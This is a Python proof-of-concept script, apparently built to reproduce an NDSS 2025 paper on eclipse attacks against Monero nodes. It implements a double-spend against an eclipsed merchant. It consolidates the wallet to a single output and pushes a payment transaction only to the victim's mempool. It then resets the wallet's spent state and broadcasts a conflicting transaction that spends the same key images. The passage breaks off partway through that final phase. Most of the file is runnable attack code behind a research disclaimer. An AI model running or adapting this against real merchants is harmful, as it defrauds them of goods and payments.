#!/usr/bin/env python3
"""
Monero Double-Spend Attack via Eclipse - Proof of Concept (RPC-based)
NDSS 2025: "Eclipse Attacks on Monero's Peer-to-Peer Network"
This script demonstrates how an eclipsed merchant node can be double-spent.
After the eclipse attack occupies the victim's whitelist and graylist,
the attacker becomes the sole relay for the merchant. The attacker can then:
1. Send a payment TX to the merchant (who sees it because attacker relays it)
2. Send a conflicting TX to the real network (spending same outputs elsewhere)
3. The merchant delivers goods thinking payment is valid
4. The real network confirms the conflicting TX; merchant's payment is void

Prerequisites:
 - Eclipse attack must be active (victim's peerlist occupied)
 - Attacker has a wallet with funds on the real network
 - monero-wallet-rpc running on VM2 (with Wallet A opened)
 - Attacker can reach VM1 and VM2 RPC endpoints
For educational/research purposes only. Use responsibly in lab environments.
"""
import json
import time
import argparse
import logging
import requests
from typing import Optional
from dataclasses import dataclass
# Configure logging (will be updated if --debug flag is used)
logging.basicConfig(
   level=logging.INFO,
   format='%(asctime)s [%(levelname)s] %(message)s',
   datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)
@dataclass
class DoubleSpendConfig:
   
   # VM1: Victim/Merchant node (eclipsed)
   vm1_ip: str = "192.168.15.9"
   vm1_daemon_port: int = 28081         # VM1's monerod RPC port
   # VM2: Honest node (real network) + monerod + wallet-rpc
   vm2_ip: str = "192.168.15.10"
   vm2_daemon_port: int = 28081         # VM2's monerod RPC port
   vm2_wallet_rpc_port: int = 28088     # VM2's wallet-rpc port
   # Wallet B address (merchant on VM1)
   wallet_b_address: str = "9wkjUbvetZaMSYwskFNX9dbMMs4JwyV8kaLxMV99WJiiYNh4ePsQpXUBM6nVtSbaNiY5TxdQRnq9PcDdR6bRjKbvQNKW79C"
   # Wallet C address (destination for conflicting TX on VM2)
   wallet_c_address: str = "9yzMeQEzVejTcinp4TtAC2J4eHoVXDuk4FDL4GgXrj8p3BqLVFULsLq7dW9LB3fRjNZoWVgAhu72NB4juQFTgw6Y9HUiU6H"
   # Attack parameters
   payment_amount: float = 0.1          # Amount to "pay" merchant (in XMR)
   network: str = "testnet"
   use_vm1_daemon_for_payment: bool = True  # Use VM1's daemon for payment TX ring members
def rpc_call(url: str, method: str, params: dict = None, timeout: int = 60) -> Optional[dict]:
   
   payload = {
       "jsonrpc": "2.0",
       "id": "0",
       "method": method
   }
   if params:
       payload["params"] = params
   try:
       logger.debug(f"[RPC CALL] {method}")
       logger.debug(f"[RPC URL] {url}")
       if params:
           # Log params but hide sensitive data
           params_log = json.dumps(params, indent=2, default=str)
           if len(params_log) > 500:
               logger.debug(f"[RPC PARAMS] (truncated to 500 chars): {params_log[:500]}")
           else:
               logger.debug(f"[RPC PARAMS] {params_log}")
       response = requests.post(url, json=payload, timeout=timeout)
       result = response.json()
       if "error" in result:
           logger.error(f"[RPC ERROR] {method}: {result['error']}")
           return None
       result_value = result.get("result", {})
       if isinstance(result_value, dict) and len(str(result_value)) > 300:
           logger.debug(f"[RPC RESPONSE] (large response, first 300 chars): {str(result_value)[:300]}")
       else:
           logger.debug(f"[RPC RESPONSE] {result_value}")
       return result_value
   except Exception as e:
       logger.error(f"[RPC ERROR] RPC call failed ({method} -> {url}): {e}")
       return None
def daemon_rpc(ip: str, port: int, method: str, params: dict = None) -> dict:
   """Make a JSON-RPC call to a Monero daemon."""
   url = f"http://{ip}:{port}/json_rpc"
   return rpc_call(url, method, params)
def daemon_http(ip: str, port: int, endpoint: str, data: dict = None) -> dict:
   """Make an HTTP call to a Monero daemon (non-JSON-RPC endpoints)."""
   url = f"http://{ip}:{port}/{endpoint}"
   try:
       if data:
           response = requests.post(url, json=data, timeout=30)
       else:
           response = requests.get(url, timeout=30)
       return response.json()
   except Exception as e:
       logger.error(f"HTTP call failed ({endpoint} -> {url}): {e}")
       return None
def get_blockchain_height(ip: str, port: int) -> int:
   """Get the current blockchain height of a node."""
   result = daemon_rpc(ip, port, "get_block_count")
   if result:
       return result.get("count", 0)
   return 0
def get_connections(ip: str, port: int) -> list:
   """Get the list of connections from a node."""
   result = daemon_rpc(ip, port, "get_connections")
   if result:
       return result.get("connections", [])
   return []
def get_peer_list(ip: str, port: int) -> dict:
   """Get the peer list from a node."""
   result = daemon_http(ip, port, "get_peer_list")
   return result
def get_tx_pool(ip: str, port: int) -> list:
   """Get the transaction pool from a node."""
   result = daemon_http(ip, port, "get_transaction_pool")
   if result:
       return result.get("transactions", [])
   return []
def get_wallet_rpc_url(config: 'DoubleSpendConfig') -> str:
   """Get the wallet RPC URL."""
   return f"http://{config.vm2_ip}:{config.vm2_wallet_rpc_port}/json_rpc"
def get_wallet_balance(config: 'DoubleSpendConfig') -> dict:
   """Get wallet balance via RPC."""
   wallet_rpc_url = get_wallet_rpc_url(config)
   result = rpc_call(wallet_rpc_url, "get_balance")
   return result
def get_wallet_address(config: 'DoubleSpendConfig') -> str:
   wallet_rpc_url = get_wallet_rpc_url(config)
   result = rpc_call(wallet_rpc_url, "get_address")
   return result.get("address", "") if result else ""

def get_incoming_transfers(config: 'DoubleSpendConfig') -> dict:
   """Get list of incoming transfers (outputs) in the wallet."""
   wallet_rpc_url = get_wallet_rpc_url(config)
   params = {"transfer_type": "available"}  # Only show unspent outputs
   result = rpc_call(wallet_rpc_url, "incoming_transfers", params)
   return result if result else {}

def diagnose_wallet_outputs(config: 'DoubleSpendConfig'):
   """Diagnose wallet output status and provide recommendations."""
   logger.info("=" * 70)
   logger.info("WALLET OUTPUT DIAGNOSTIC")
   logger.info("=" * 70)
   
   # Get balance
   balance = get_wallet_balance(config)
   if not balance:
       logger.error("Cannot connect to wallet RPC!")
       return
   
   total_balance = balance.get('balance', 0) / 1e12
   unlocked_balance = balance.get('unlocked_balance', 0) / 1e12
   
   logger.info(f"Total balance:    {total_balance:.6f} XMR")
   logger.info(f"Unlocked balance: {unlocked_balance:.6f} XMR")
   logger.info(f"Locked balance:   {total_balance - unlocked_balance:.6f} XMR")
   
   if unlocked_balance < 0.001:
       logger.error("")
       logger.error("!" * 70)
       logger.error("PROBLEM: Not enough unlocked balance!")
       logger.error("!" * 70)
       logger.error("")
       logger.error("Your wallet has insufficient unlocked funds.")
       logger.error("")
       logger.error("Possible causes:")
       logger.error("1. Wallet is empty - need to receive testnet XMR first")
       logger.error("2. Recent transactions not yet confirmed (locked)")
       logger.error("3. Need to wait 10 blocks (~20 minutes) for outputs to unlock")
       logger.error("")
       logger.error("Solutions:")
       logger.error("1. Get testnet XMR from faucet or mining")
       logger.error("2. Wait for pending transactions to confirm")
       logger.error("3. Check wallet sync status")
       return
   
   # Get outputs
   transfers = get_incoming_transfers(config)
   if not transfers or "transfers" not in transfers:
       logger.warning("Could not get output details")
       logger.info(f"But you have {unlocked_balance:.6f} XMR unlocked")
       return
   
   outputs = transfers["transfers"]
   num_outputs = len(outputs)
   
   logger.info("")
   logger.info(f"Number of outputs: {num_outputs}")
   
   if num_outputs == 0:
       logger.error("Wallet has 0 outputs but shows balance - this is unusual!")
       return
   
   # Analyze output sizes
   output_sizes = [out.get('amount', 0) / 1e12 for out in outputs]
   output_sizes.sort(reverse=True)
   
   logger.info(f"Largest output:    {output_sizes[0]:.6f} XMR")
   if num_outputs > 1:
       logger.info(f"Smallest output:   {output_sizes[-1]:.6f} XMR")
       logger.info(f"Average output:    {sum(output_sizes)/len(output_sizes):.6f} XMR")
   
   logger.info("")
   logger.info("Output distribution:")
   dust_count = sum(1 for s in output_sizes if s < 0.001)
   small_count = sum(1 for s in output_sizes if 0.001 <= s < 0.01)
   medium_count = sum(1 for s in output_sizes if 0.01 <= s < 0.1)
   large_count = sum(1 for s in output_sizes if s >= 0.1)
   
   logger.info(f"  Dust (< 0.001 XMR):   {dust_count} outputs")
   logger.info(f"  Small (0.001-0.01):   {small_count} outputs")
   logger.info(f"  Medium (0.01-0.1):    {medium_count} outputs")
   logger.info(f"  Large (>= 0.1 XMR):   {large_count} outputs")
   
   logger.info("")
   logger.info("=" * 70)
   logger.info("RECOMMENDATION")
   logger.info("=" * 70)
   
   if num_outputs == 1:
       logger.info("[✓] PERFECT: Wallet has exactly 1 output")
       logger.info("    Ready for double-spend attack!")
   elif num_outputs <= 5 and large_count > 0:
       logger.info("[~] OK: Wallet has few outputs with at least one large output")
       logger.info("    Should work, but consolidation recommended for best results")
   elif dust_count > 50:
       logger.warning("[!] WARNING: Wallet has many dust outputs!")
       logger.warning(f"    {dust_count} dust outputs need consolidation")
       logger.warning("    Use sweep_dust or sweep_all to consolidate")
   else:
       logger.info(f"[~] Wallet has {num_outputs} outputs")
       logger.info("    Consolidation recommended for deterministic output selection")
   
   logger.info("")

def verify_single_output(config: 'DoubleSpendConfig') -> bool:
   """
   Verify that wallet has been consolidated to a single output.
   This is CRITICAL for the double-spend attack to work!
   """
   logger.info("=" * 60)
   logger.info("Verifying Wallet Output Consolidation")
   logger.info("=" * 60)
   
   transfers = get_incoming_transfers(config)
   if not transfers or "transfers" not in transfers:
       logger.warning("Could not get incoming transfers")
       logger.warning("Proceeding anyway, but double-spend may use different outputs!")
       return False
   
   num_outputs = len(transfers["transfers"])
   logger.info(f"Wallet has {num_outputs} available output(s)")
   
   if num_outputs == 1:
       output = transfers["transfers"][0]
       amount = output.get("amount", 0) / 1e12
       logger.info(f"[+] PERFECT: Wallet has exactly ONE output!")
       logger.info(f"    Amount: {amount:.6f} XMR")
       logger.info(f"    Key image: {output.get('key_image', 'N/A')[:32]}...")
       logger.info(f"[+] Both TXs will be forced to use THIS output → true double-spend!")
       return True
   elif num_outputs > 1:
       logger.warning(f"[!] WARNING: Wallet has {num_outputs} outputs")
       logger.warning(f"[!] Double-spend may NOT work - wallet might use different outputs!")
       logger.warning(f"[!] Run sweep consolidation and wait for confirmation first!")
       for i, output in enumerate(transfers["transfers"][:5]):
           amount = output.get("amount", 0) / 1e12
           logger.warning(f"    Output {i+1}: {amount:.6f} XMR")
       return False
   else:
       logger.error("[!] ERROR: Wallet has NO available outputs!")
       logger.error("[!] Cannot create transactions!")
       return False

def get_wallet_address(config: 'DoubleSpendConfig') -> str:
   """Get the primary wallet address via RPC."""
   wallet_rpc_url = get_wallet_rpc_url(config)
   result = rpc_call(wallet_rpc_url, "get_address")
   if result:
       return result.get("address", "")
   return ""
def create_transaction_via_rpc(config: 'DoubleSpendConfig', dest_address: str, amount_xmr: float, do_not_relay: bool = True, use_custom_daemon: str = None) -> Optional[dict]:
   """
   Create a transaction via wallet RPC.
   
   Returns dict with tx_hash, tx_blob, and tx_key, or None on failure.
   """
   wallet_rpc_url = get_wallet_rpc_url(config)
   amount_atomic = int(amount_xmr * 1e12)
   params = {
       "destinations": [
           {"amount": amount_atomic, "address": dest_address}
       ],
       "priority": 0,
       "ring_size": 16,
       "get_tx_key": True,
       "get_tx_hex": True,
       "do_not_relay": do_not_relay,
   }
   # If custom daemon specified, log it (note: wallet-rpc always uses its configured daemon)
   # The daemon_rpc_url param is NOT supported by wallet RPC transfer method
   if use_custom_daemon:
       logger.warning(f"[DEBUG] custom daemon requested ({use_custom_daemon}) but wallet-rpc uses its own daemon")
   logger.info(f"[DEBUG] Using wallet-rpc's configured daemon for ring members")
   logger.info(f"[DEBUG] TX Creation Parameters:")
   logger.info(f"[DEBUG]   - Destination: {dest_address}")
   logger.info(f"[DEBUG]   - Amount: {amount_xmr} XMR ({amount_atomic} atomic)")
   logger.info(f"[DEBUG]   - do_not_relay: {do_not_relay}")
   logger.info(f"[DEBUG]   - ring_size: {params['ring_size']}")
   logger.info(f"[DEBUG]   - priority: {params['priority']}")
   logger.info(f"[DEBUG]   - wallet_rpc_url: {wallet_rpc_url}")
   logger.info(f"Creating TX via wallet RPC...")
   logger.info(f"[DEBUG] This may take 10-60 seconds...")
   result = rpc_call(wallet_rpc_url, "transfer", params, timeout=90)
   if result:
       logger.info(f"[DEBUG] RPC Response received")
       if "tx_hash" in result:
           logger.info(f"[DEBUG] TX Details:")
           logger.info(f"[DEBUG]   - tx_hash: {result.get('tx_hash', 'N/A')}")
           logger.info(f"[DEBUG]   - fee: {result.get('fee', 0) / 1e12:.6f} XMR")
           logger.info(f"[DEBUG]   - tx_hex length: {len(result.get('tx_hex', '')) // 2} bytes")
           logger.info(f"[DEBUG]   - tx_key: {result.get('tx_key', 'N/A')[:32]}...")
           
           # Log spent key images if available
           if "spent_key_images" in result:
               logger.info(f"[DEBUG]   - Spent key images: {result['spent_key_images']}")
           elif "tx_metadata" in result:
               logger.info(f"[DEBUG]   - TX metadata available (contains key images)")
           
           # Log amount of inputs used
           if "amount_keys" in result:
               logger.info(f"[DEBUG]   - Number of inputs: {len(result['amount_keys'])}")
           
           logger.info(f"[+] TX created successfully!")
           return result
       else:
           logger.error(f"[DEBUG] RPC Response has no tx_hash!")
           logger.error(f"[DEBUG] Full response: {json.dumps(result, indent=2)}")
           logger.error(f"Failed to create TX via RPC")
           return None
   else:
       logger.error(f"[DEBUG] RPC returned None")
       logger.error(f"Failed to create TX via RPC")
       return None
def rescan_spent_via_rpc(config: 'DoubleSpendConfig') -> bool:
   """
   Reset wallet's spent state via RPC rescan_spent.
   After creating a TX with do_not_relay, wallet marks outputs as spent.
   Since that TX was never broadcast, rescan_spent asks daemon if outputs
   are spent → daemon says NO → wallet un-marks them.
   Same outputs become available for reuse → next TX uses same key images.
   """
   wallet_rpc_url = get_wallet_rpc_url(config)
   logger.info("[DEBUG] Calling rescan_spent via wallet RPC...")
   logger.info(f"[DEBUG]   - Wallet RPC URL: {wallet_rpc_url}")
   logger.info(f"[DEBUG]   - Purpose: Un-mark outputs so they can be reused")
   result = rpc_call(wallet_rpc_url, "rescan_spent")
   if result is not None:
       logger.info(f"[DEBUG] rescan_spent response: {result}")
       logger.info("[+] Wallet spent state reset - outputs available for reuse (same key images)")
       return True
   else:
       logger.error("[DEBUG] rescan_spent RPC returned None")
       logger.error("[-] rescan_spent via RPC failed")
       return False
def sweep_dust_via_rpc(config: 'DoubleSpendConfig') -> bool:
   """
   Consolidate ALL wallet outputs into a single UTXO using sweep_all.
   """
   wallet_rpc_url = get_wallet_rpc_url(config)
   logger.info("=" * 60)
   logger.info("CRITICAL: Consolidating ALL wallet outputs into ONE")
   logger.info("=" * 60)
   logger.info("This ensures both TXs will use the SAME output (same key images)")
   logger.info("")
   
   # Diagnose the wallet to understand what we're working with
   diagnose_wallet_outputs(config)
   logger.info("")
   
   # Check if we have enough balance to consolidate
   balance = get_wallet_balance(config)
   if not balance:
       logger.error("Cannot get wallet balance!")
       return False
   
   unlocked = balance.get('unlocked_balance', 0) / 1e12
   if unlocked < 0.001:
       logger.error("")
       logger.error("!" * 70)
       logger.error("CANNOT CONSOLIDATE: Insufficient unlocked balance!")
       logger.error("!" * 70)
       logger.error(f"Unlocked balance: {unlocked:.6f} XMR")
       logger.error("")
       logger.error("You need at least 0.001 XMR to consolidate (to cover fees).")
       logger.error("")
       logger.error("Solutions:")
       logger.error("1. Get more testnet XMR from a faucet")
       logger.error("2. Mine some testnet blocks")
       logger.error("3. Wait for pending transactions to unlock (10 blocks)")
       logger.error("")
       return False
   
   # Use sweep_all to send ALL funds to ourselves
   my_address = get_wallet_address(config)
   if not my_address:
       logger.error("Cannot get wallet address for consolidation")
       return False
   
   # Get output count to determine strategy
   transfers = get_incoming_transfers(config)
   num_outputs = len(transfers.get("transfers", [])) if transfers else 0
   
   logger.info("")
   logger.info("=" * 70)
   logger.info("CONSOLIDATION STRATEGY")
   logger.info("=" * 70)
   
   # If wallet has many outputs (> 100), use sweep_dust first
   if num_outputs > 100:
       logger.info(f"Wallet has {num_outputs} outputs - using 2-stage consolidation:")
       logger.info("  Stage 1: sweep_dust (consolidate dust only, creates multiple TXs)")
       logger.info("  Stage 2: sweep_all (final consolidation after Stage 1 confirms)")
       logger.info("")
       
       # Stage 1: sweep_dust
       logger.info("=" * 70)
       logger.info("STAGE 1: Consolidating dust outputs")
       logger.info("=" * 70)
       logger.info("Calling sweep_dust to consolidate tiny outputs...")
       logger.info("This may create multiple TXs (one per ~16 inputs), may take 30-120s...")
       logger.info("")
       
       dust_result = rpc_call(wallet_rpc_url, "sweep_dust", {}, timeout=120)
       
       logger.info("[DEBUG] sweep_dust result type: " + str(type(dust_result)))
       if dust_result:
           logger.info("[DEBUG] sweep_dust result keys: " + str(dust_result.keys() if isinstance(dust_result, dict) else "not a dict"))
           logger.info("[DEBUG] sweep_dust full result: " + str(dust_result)[:500])
       else:
           logger.info("[DEBUG] sweep_dust returned None")
       
       if dust_result and "tx_hash_list" in dust_result:
           tx_hashes = dust_result["tx_hash_list"]
           if tx_hashes and len(tx_hashes) > 0:
               logger.info(f"[+] Stage 1 complete: Created {len(tx_hashes)} dust consolidation TX(s)")
               for i, tx_hash in enumerate(tx_hashes[:5], 1):
                   logger.info(f"    TX {i}: {tx_hash}")
               if len(tx_hashes) > 5:
                   logger.info(f"    ... and {len(tx_hashes) - 5} more")
               
               logger.info("")
               logger.info("!" * 70)
               logger.info("STAGE 1 COMPLETE: Dust consolidation TXs submitted!")
               logger.info("!" * 70)
               logger.info("These transactions need to CONFIRM before Stage 2.")
               logger.info("")
               logger.info("Next steps:")
               logger.info("  1. Wait 20-30 minutes for confirmations")
               logger.info("  2. Run the attack script again")
               logger.info("  3. Choose consolidate again - will do Stage 2 (final)")
               logger.info("  4. After Stage 2 confirms, you'll have 1 output ready for attack")
               logger.info("!" * 70)
               return True
           else:
               logger.info("[-] sweep_dust returned empty tx_hash_list")
               logger.info("[DEBUG] This might mean no dust, or dust threshold not met")
               logger.info("Proceeding to Stage 2 (sweep_all)...")
       else:
           logger.warning("")
           logger.warning("[-] sweep_dust failed or returned unexpected format")
           if dust_result:
               logger.warning(f"[DEBUG] Result was: {dust_result}")
               # Check for common error messages
               if isinstance(dust_result, dict):
                   if "error" in dust_result:
                       logger.error(f"[!] Error from wallet: {dust_result['error']}")
                   if "message" in dust_result:
                       logger.error(f"[!] Message: {dust_result['message']}")
                   # Check if we got unsigned_txset (means no actual TX was created)
                   if "unsigned_txset" in dust_result and not dust_result.get("tx_hash_list"):
                       logger.warning("[!] Wallet returned unsigned_txset (no TX created)")
                       logger.warning("[!] Your outputs don't meet Monero's dust threshold")
                       logger.warning("[!] Monero's dust threshold is MUCH lower than 0.001 XMR")
           logger.warning("")
           logger.warning("Reason: Your wallet outputs are too LARGE to be 'dust'")
           logger.warning("Even though they're small (< 0.001 XMR), Monero's dust")
           logger.warning("threshold is typically < 0.000000001 XMR (1 piconero)")
           logger.warning("")
           logger.info("Skipping sweep_dust, will attempt direct sweep_all instead...")
   else:
       logger.info(f"Wallet has {num_outputs} outputs - consolidating with sweep_all...")
   
   logger.info("")
   logger.info("=" * 70)
   logger.info("FINAL CONSOLIDATION (sweep_all)")
   logger.info("=" * 70)
   
   # Check how many outputs remain
   transfers = get_incoming_transfers(config)
   remaining_outputs = len(transfers.get("transfers", [])) if transfers else num_outputs
   logger.info(f"Attempting to consolidate {remaining_outputs} remaining outputs...")
   
   logger.info(f"Sweeping all funds to self: {my_address[:20]}...")
   params = {
       "address": my_address,
       "priority": 0,
       "ring_size": 16,
       "get_tx_keys": True,
   }
   logger.info("[*] Creating final consolidation transaction...")
   logger.info("    This may take 30-120 seconds...")
   
   # Show balance
   balance = get_wallet_balance(config)
   if balance:
       logger.info(f"    Current balance: {balance.get('balance', 0) / 1e12:.6f} XMR")
       logger.info(f"    Unlocked balance: {balance.get('unlocked_balance', 0) / 1e12:.6f} XMR")
   
   result = rpc_call(wallet_rpc_url, "sweep_all", params, timeout=120)
   if result:
       if "tx_hash_list" in result and result["tx_hash_list"]:
           logger.info(f"[+] Consolidated into {len(result['tx_hash_list'])} TX(s)")
           logger.info(f"    TX hashes: {result['tx_hash_list']}")
           logger.info(f"[!] IMPORTANT: Wait for this TX to confirm before proceeding!")
           logger.info(f"[!] After confirmation, wallet will have EXACTLY ONE output")
           return True
       else:
           logger.info("[-] Already consolidated (no TXs created)")
           logger.info("[!] Wallet should have minimal outputs")
           return True
   else:
       logger.error("[-] sweep_all via RPC failed")
       return False
def relay_tx_to_node(ip: str, port: int, tx_hex: str, do_not_relay: bool = False) -> bool:
   """Submit a raw transaction to a specific node's daemon RPC.
   Args:
       do_not_relay: If True, node accepts TX into mempool but does NOT relay to peers.
                     If False, node accepts TX and relays it to all connected peers.
   """
   data = {
       "tx_as_hex": tx_hex,
       "do_not_relay": do_not_relay,
   }
   logger.info(f"[DEBUG] Relaying TX to {ip}:{port}")
   logger.info(f"[DEBUG]   - TX hex length: {len(tx_hex) // 2} bytes")
   logger.info(f"[DEBUG]   - do_not_relay: {do_not_relay}")
   logger.info(f"[DEBUG]   - Endpoint: http://{ip}:{port}/send_raw_transaction")
   result = daemon_http(ip, port, "send_raw_transaction", data)
   if result:
       logger.info(f"[DEBUG] Response from {ip}:{port}:")
       for key, value in result.items():
           logger.info(f"[DEBUG]   - {key}: {value}")
       status = result.get("status", "")
       if status == "OK":
           logger.info(f"[+] TX successfully relayed to {ip}:{port} (do_not_relay={do_not_relay})")
           return True
       else:
           logger.error(f"[-] Relay failed with status: {status}")
           logger.error(f"[DEBUG] Full response: {json.dumps(result, indent=2)}")
   else:
       logger.error(f"[DEBUG] No response from {ip}:{port}")
   return False
def verify_eclipse(config: DoubleSpendConfig) -> bool:
   """
   Verify that the merchant node is eclipsed.
   Check that all its connections are to attacker-controlled IPs.
   """
   logger.info("=" * 60)
   logger.info("Verifying Eclipse Status")
   logger.info("=" * 60)
   # Check merchant's connections
   connections = get_connections(config.vm1_ip, config.vm1_daemon_port)
   if not connections:
       logger.warning("Could not get merchant connections (RPC may be disabled)")
       logger.info("Skipping eclipse verification - proceeding with attack")
       return True
   logger.info(f"Merchant has {len(connections)} connections:")
   for conn in connections:
       direction = "OUT" if conn.get("incoming") == False else "IN"
       host = conn.get("host", "?")
       port = conn.get("port", "?")
       logger.info(f"  [{direction}] {host}:{port}")
   # Check blockchain heights
   merchant_height = get_blockchain_height(config.vm1_ip, config.vm1_daemon_port)
   vm2_height = get_blockchain_height(config.vm2_ip, config.vm2_daemon_port)
   logger.info(f"VM1 (merchant) height: {merchant_height}")
   logger.info(f"VM2 (real network) height: {vm2_height}")
   if merchant_height == 0:
       logger.warning("Cannot get merchant height - RPC may be restricted")
   return True
def phase1_send_payment_to_merchant(config: DoubleSpendConfig) -> Optional[dict]:
   """
   Phase 1: Wallet A → Wallet B (payment to merchant).
   """
   logger.info("=" * 60)
   logger.info("Phase 1: Wallet A → Wallet B (Payment to Merchant)")
   logger.info("=" * 60)
   merchant_address = config.wallet_b_address
   logger.info(f"Wallet B address: {merchant_address[:20]}...{merchant_address[-10:]}")
   logger.info(f"[DEBUG] Phase 1: TX Creation and Submission Summary")
   logger.info(f"[DEBUG]   - Merchant address (Wallet B): {merchant_address[:20]}...{merchant_address[-10:]}")
   logger.info(f"[DEBUG]   - Amount: {config.payment_amount} XMR")
   # Create TX from Wallet A via wallet-rpc (do_not_relay=True)
   # Use VM1's daemon for ring member selection so TX is valid on VM1's blockchain
   logger.info("Creating payment TX from Wallet A via wallet-rpc (do_not_relay=True)...")
   if config.use_vm1_daemon_for_payment:
       logger.info(f"[DEBUG] Using VM1's daemon ({config.vm1_ip}:{config.vm1_daemon_port}) for ring member selection...")
       vm1_daemon_addr = f"{config.vm1_ip}:{config.vm1_daemon_port}"
       tx_result = create_transaction_via_rpc(config, merchant_address, config.payment_amount, do_not_relay=True, use_custom_daemon=vm1_daemon_addr)
   else:
       logger.info(f"[DEBUG] Using default daemon for ring member selection...")
       tx_result = create_transaction_via_rpc(config, merchant_address, config.payment_amount, do_not_relay=True)
   if not tx_result:
       logger.error("Failed to create payment transaction")
       return None
   tx_hash = tx_result.get("tx_hash", "unknown")
   tx_hex = tx_result.get("tx_blob", "") or tx_result.get("tx_hex", "")
   tx_key = tx_result.get("tx_key", "")
   fee = tx_result.get("fee", 0)
   logger.info(f"[DEBUG] Payment TX Details:")
   logger.info(f"[DEBUG]   - TX hash: {tx_hash}")
   logger.info(f"[DEBUG]   - Fee: {fee / 1e12:.6f} XMR")
   logger.info(f"[DEBUG]   - TX size: {len(tx_hex) // 2} bytes")
   logger.info(f"[DEBUG]   - TX key: {tx_key}")
   # Submit raw TX to VM1's daemon with do_not_relay=True
   # VM1 accepts it into mempool but does NOT forward to peers
   logger.info(f"[DEBUG] Submitting payment TX to VM1...")
   logger.info(f"Submitting TX to VM1 daemon ({config.vm1_ip}:{config.vm1_daemon_port}) with do_not_relay=True...")
   success = relay_tx_to_node(config.vm1_ip, config.vm1_daemon_port, tx_hex, do_not_relay=True)
   if success:
       logger.info("[+] Payment TX (A→B) accepted by VM1 mempool (do_not_relay=True)!")
   else:
       logger.error("[-] Failed to submit TX to VM1 daemon - this is a problem!")
       logger.error("[DEBUG] The TX was created successfully but VM1 rejected it on relay")
   return {
       "tx_hash": tx_hash,
       "tx_hex": tx_hex,
       "tx_key": tx_key,
       "amount": int(config.payment_amount * 1e12),
       "fee": fee,
       "merchant_address": merchant_address,
       "full_result": tx_result,  # Store full result to compare later
   }
def phase2_verify_merchant_sees_payment(config: DoubleSpendConfig, tx_hash: str) -> bool:
   """
   Phase 2: Verify the merchant's node has the payment in its TX pool.
   """
   logger.info("=" * 60)
   logger.info("Phase 2: Verifying Merchant Sees Payment")
   logger.info("=" * 60)
   logger.info(f"[DEBUG] Querying merchant's TX pool...")
   logger.info(f"[DEBUG]   - Target TX hash: {tx_hash}")
   logger.info(f"[DEBUG]   - Merchant endpoint: http://{config.vm1_ip}:{config.vm1_daemon_port}")
   # Check merchant's TX pool
   pool = get_tx_pool(config.vm1_ip, config.vm1_daemon_port)
   if pool is None:
       logger.error(f"[DEBUG] get_tx_pool returned None!")
       logger.warning("Could not check merchant's TX pool")
       return False
   logger.info(f"[DEBUG] Merchant's TX pool has {len(pool)} transactions:")
   if pool:
       for i, tx in enumerate(pool[:10]):  # Show first 10
           tx_id = tx.get("id_hash", "?")
           tx_size = tx.get("blob_size", 0)
           logger.info(f"[DEBUG]   [{i}] {tx_id} (size: {tx_size} bytes)")
           if tx_id == tx_hash:
               logger.info(f"[DEBUG]       ^ THIS IS OUR PAYMENT TX! ✓")
   else:
       logger.info(f"[DEBUG] TX pool is empty!")
   found = any(tx.get("id_hash") == tx_hash for tx in pool)
   if found:
       logger.info(f"[+] Merchant's mempool CONTAINS payment TX: {tx_hash}")
       return True
   else:
       logger.error(f"[-] Payment TX NOT found in merchant's mempool!")
       logger.error(f"[DEBUG] Expected to find: {tx_hash}")
       logger.error(f"[DEBUG] But pool contains: {[tx.get('id_hash', '?') for tx in pool[:5]]}")
       return False
def phase3_double_spend(config: DoubleSpendConfig, original_tx: dict) -> Optional[dict]:
   """
   Phase 3: Wallet A → Wallet C (conflicting TX to real network).
   """
   logger.info("=" * 60)
   logger.info("Phase 3: Wallet A → Wallet C (Conflicting TX to VM2)")
   logger.info("=" * 60)
   # Step 1: Reset Wallet A so same outputs are available again
   logger.info("[DEBUG] Step 1: Resetting wallet spent state...")
   logger.info(f"[DEBUG] Original TX details:")
   logger.info(f"[DEBUG]   - TX hash: {original_tx.get('tx_hash', '?')}")
   logger.info(f"[DEBUG]   - Amount: {original_tx.get('amount', 0) / 1e12:.6f} XMR")
   if not rescan_spent_via_rpc(config):
       logger.error("Failed to reset wallet spent state")
       logger.info("Trying to proceed anyway...")
   # Step 2: Use Wallet C address
   wallet_c_address = config.wallet_c_address
   logger.info(f"[DEBUG] Step 2: Creating conflicting TX...")
   logger.info(f"[DEBUG]   - Destination (Wallet C): {wallet_c_address[:20]}...{wallet_c_address[-10:]}")
   # Step 3: Create conflicting TX (A → C) using same outputs = same key images
   amount_atomic = original_tx["amount"]
   amount_xmr = amount_atomic / 1e12
   logger.info(f"[DEBUG]   - Amount: {amount_xmr:.6f} XMR ({amount_atomic} atomic)")
   logger.info(f"[DEBUG]   - Expected key images: SAME as original TX")
   logger.info(f"Creating conflicting TX (A→C) for {amount_xmr:.6f} XMR...")
   logger.info("(Using VM2's daemon; same key images as Phase 1 TX due to rescan_spent)")
   conflict_result = create_transaction_via_rpc(config, wallet_c_address, amount_xmr, do_not_relay=False)
   if not conflict_result:
       logger.error("Failed to create conflicting transaction")
       logger.info("(This may fail if wallet reset didn't work)")
       return None
   conflict_hash = conflict_result.get("tx_hash", "unknown")
   conflict_hex = conflict_result.get("tx_blob", "") or conflict_result.get("tx_hex", "")
   conflict_key = conflict_result.get("tx_key", "")
   logger.info(f"[DEBUG] Step 3: Conflicting TX created")
   logger.info(f"[DEBUG]   - TX hash: {conflict_hash}")
   logger.info(f"[DEBUG]   - TX hex length: {len(conflict_hex) // 2} bytes")
   logger.info(f"[DEBUG]   - Fee: {conflict_result.get('fee', 0) / 1e12:.6f} XMR")
   logger.info(f"[DEBUG]   - TX key: {conflict_key}")
   
   # CRITICAL: Compare TX keys 
   original_key = original_tx.get("tx_key", "")
   logger.info(f"[DEBUG] ")
   logger.info(f"[DEBUG] KEY IMAGE VERIFICATION:")
   logger.info(f"[DEBUG]   - Original TX key:  {original_key}")
   logger.info(f"[DEBUG]   - Conflict TX key:  {conflict_key}")
   
   if original_key == conflict_key:
       logger.error(f"[!] WARNING: TX keys are IDENTICAL - this is the SAME transaction!")
       logger.error(f"[!] This is NOT a double-spend!")
   else:
       logger.info(f"[+] TX keys are different (expected)")
       logger.info(f"[!] NOTE: Different tx_key is NORMAL - key images determine double-spend")
       logger.info(f"[!] Both TXs should have used the SAME outputs (same key images)")
   
   # Step 4: Submit conflicting TX to VM2's daemon with do_not_relay=False
   logger.info(f"[DEBUG] Step 4: Submitting to VM2 daemon...")
   logger.info(f"Submitting conflicting TX to VM2 daemon ({config.vm2_ip}:{config.vm2_daemon_port}) with do_not_relay=False...")
